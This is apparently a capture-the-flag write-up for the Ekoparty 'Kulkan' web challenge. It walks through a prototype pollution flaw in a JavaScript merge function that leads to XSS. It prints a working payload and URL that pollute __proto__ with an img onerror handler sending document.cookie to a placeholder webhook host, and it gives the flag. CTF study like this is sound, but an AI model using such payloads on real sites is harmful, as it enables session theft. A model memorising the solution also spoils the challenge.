# Kulkan

## Description

![kulkan-1](/assets/ctf/ekoparty/kulkan-1.png)

Challenge: [Link](https://www.penetration-testing.com/) 

Sponsor: [Kulkan Security](https://www.kulkan.com/)

## Solution

Dive into source code: [challenge.js](https://www.penetration-testing.com/static/challenge.js)

1\. `params` are taken from URL or the document element.

```js
const params = new URLSearchParams(window.location.search);
document.getElementById('input_json').value = params.get('input_json') || '';
```

2\. XSS Vector

```js
...
let randomObject = {};
...
if (randomObject.win) {
    complimentDiv.innerHTML = randomObject.win;
}
```

3\. Prototype Pollution Vector, > [More](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution) <

```js
function mergeObjects(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) {
                target[key] = {};
            }
            mergeObjects(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
```

Payload: 

```json
{
  "compliment": "Messi is such an incredible..",
  "Object": {
    "__proto__": {
      "win": "<img src=x onerror='this.src=`<WebhookLink>/?c=${document.cookie}`; this.removeAttribute(`onerror`);'>"
    }
  },
  "color": "blue",
  "fontSize": "24px"
}
```

URL Payload: 

```json
https://www.penetration-testing.com/?input_json={"compliment":%20"Messi%20is%20such%20an%20incredible..","Object":%20{"__proto__":%20{"win":%20"<img%20src=x%20onerror=%27this.src=`<WebhookLink>/?c=${document.cookie}`;%20this.removeAttribute(`onerror`);%27>"}},"color":%20"blue","fontSize":%20"24px"}
```
::: info :information_source:
Webhook sites like [beeceptor](https://beeceptor.com) or [webhook.site](https://webhook.site/)
:::
::: tip Flag
`EKO{Kulk4n__Quetz4}`
:::